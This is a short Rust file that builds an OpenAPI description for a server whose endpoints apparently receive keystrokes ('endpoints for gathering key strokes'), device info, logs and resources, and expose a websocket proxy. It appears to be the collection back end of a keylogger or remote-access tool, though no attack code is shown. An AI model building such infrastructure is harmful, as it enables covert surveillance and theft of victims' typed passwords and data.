use utoipa::OpenApi;

pub use crate::public_endpoints::get_ping;
pub use crate::public_endpoints::info;
pub use crate::public_endpoints::keylogger;
pub use crate::public_endpoints::proxy;

#[derive(OpenApi)]
#[openapi(
    paths(
        get_ping::get_ping,

        info::get_uptime::get_uptime,
        info::post_logs::post_logs,
        info::post_resources::post_resources,

        keylogger::post_keylogger::post_keylogger,

        proxy::ws_proxy::ws_proxy,
        // routes::get_ping::get_ping,
        // routes::get_public_pem::get_public_pem,
        // routes::post_login::post_login,
        // routes::post_refresh_session::post_refresh_session,
        // routes::post_signup::post_signup,
    ),
    tags(
        (name = "Keylogger", description = "endpoints for gathering key strokes"),
        (name = "Info", description = "endpoints for gathering device info"),
        (name = "Health", description = "health"),
        (name = "Proxy", description = "proxy"),
    ),
    security()

)]
pub struct ApiDoc;
